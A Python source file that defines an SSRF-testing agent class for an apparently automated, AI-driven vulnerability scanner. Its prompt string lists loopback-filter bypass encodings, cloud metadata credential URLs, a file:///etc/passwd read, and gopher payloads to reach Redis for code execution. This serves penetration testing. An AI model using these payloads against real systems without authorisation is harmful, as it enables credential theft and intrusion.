from core.base_agent import ReasoningAgent
from core.http_client import HTTPClient


class SSRFAgent(ReasoningAgent):
    VULN_TYPE = "SSRF"
    VULN_PROMPT = """
━━━ YOUR KNOWLEDGE BASE FOR SSRF ━━━

WHAT THE PARAMETER TELLS YOU BEFORE TESTING:
  Parameters that suggest the server makes an outbound request:
  url, src, href, link, target, fetch, load, import, resource, source,
  image_url, avatar_url, webhook, callback, proxy, redirect, next, host,
  dest, destination, path, file, document, feed, api, endpoint
  Features that suggest server-side fetching: import by URL, link preview,
  PDF generation from URL, screenshot service, webhook delivery, avatar import,
  file export, XML/RSS feed parsing, translation service

WHAT TELLS YOU THE SERVER IS MAKING THE REQUEST:
  If you control a URL and something fetches it → SSRF
  Test with an HTTP callback: point the URL parameter to a server you control
  A DNS lookup or HTTP hit on your server = blind SSRF confirmed
  A response that contains data from the URL you specified = full SSRF

WHAT THE RESPONSE REVEALS ABOUT THE INTERNAL NETWORK:
  Response time differences when scanning ports: faster = closed, slower = open (or vice versa)
  Different error messages for open vs closed ports: "connection refused" vs timeout
  Response body containing internal service data → full SSRF to internal service
  Response containing cloud metadata → critical

WHAT 127.0.0.1 VARIATIONS BYPASS:
  When 127.0.0.1 is blocked, try:
  127.1               → shorthand, same as 127.0.0.1
  0.0.0.0             → loopback on many systems
  localhost           → if hostname resolution is not blocked separately
  2130706433          → decimal representation of 127.0.0.1
  0x7f000001          → hex representation
  0177.0.0.1          → octal representation
  [::1]               → IPv6 localhost
  [::ffff:127.0.0.1]  → IPv4-mapped IPv6
  127.0.0.1.nip.io    → resolves to 127.0.0.1 via DNS
  What gets through depends on where validation happens vs where DNS resolution happens

WHAT TELLS YOU THE CLOUD PROVIDER:
  AWS:   169.254.169.254 — the instance metadata endpoint
         http://169.254.169.254/latest/meta-data/iam/security-credentials/
         This returns IAM role credentials → Critical
         IPv6: http://[fd00:ec2::254]/latest/meta-data/
         Token-requiring IMDSv2: need to get token first with PUT to /latest/api/token
  GCP:   http://metadata.google.internal/computeMetadata/v1/ (needs Metadata-Flavor: Google header)
         http://169.254.169.254/computeMetadata/v1/
  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (needs Metadata: true header)

WHAT URL SCHEME VARIATIONS BYPASS:
  If http:// is blocked:
  https:// → maybe not blocked
  file:///etc/passwd → read local files
  gopher:// → craft raw TCP requests (Redis, Memcached, SMTP, etc.)
  dict:// → interact with dict protocol services
  ftp:// → FTP interactions

WHAT GOPHER SSRF MEANS:
  gopher://127.0.0.1:6379/_ followed by Redis commands → SSRF to RCE via Redis
  gopher://127.0.0.1:11211/ → Memcached
  The gopher payload must be URL-encoded carefully

WHAT TELLS YOU IT IS BLIND VS FULL:
  No data returned but DNS/HTTP hit on your server → blind SSRF
  Response body contains data from internal service → full SSRF
  Blind alone is Medium; blind reaching metadata is Critical regardless

SEVERITY REASONING:
  Cloud metadata credentials (IAM keys, etc.) accessible → Critical
  Internal service response returned (Redis, admin panel, etc.) → Critical/High
  Blind SSRF with DNS/HTTP callback only → Medium
  SSRF to public IPs only → Low
"""

    def __init__(self, endpoint: dict, http: HTTPClient):
        super().__init__(endpoint, http)